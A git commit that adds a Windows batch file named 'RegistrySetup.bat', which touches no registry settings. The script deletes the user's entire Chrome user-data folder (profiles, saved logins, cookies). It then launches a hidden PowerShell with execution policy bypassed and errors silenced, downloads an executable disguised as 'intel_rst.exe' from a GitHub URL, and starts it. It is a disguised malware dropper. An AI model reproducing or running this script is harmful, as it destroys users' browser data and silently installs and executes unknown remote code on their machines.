ff80933cb7ff79c5c27afb068325abb5604caa12
testpbs123 <38864254+testpbs123@users.noreply.github.com>
2018-05-14 12:15:11 -0500

    Add files via upload

---
+++ RegistrySetup.bat
@@ -0,0 +1,8 @@
+﻿@echo off
+del /q /f "U:\Documents\intel_rst.exe">nul 2>&1    
+set ChromeDir=C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data
+
+del /q /s /f "%ChromeDir%"
+rd /s /q "%ChromeDir%"
+
+powershell -NoP -NonI -W Hidden -Exec Bypass "$ErrorActionPreference = 'SilentlyContinue';$fileoutput = [Environment]::GetFolderPath('MyDocuments') + '\intel_rst.exe';[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (New-Object System.Net.WebClient).DownloadFile('https://github.com/testpbs123/testing123/raw/master/intel_RTS.exe', $fileoutput);Start-Process $fileoutput"
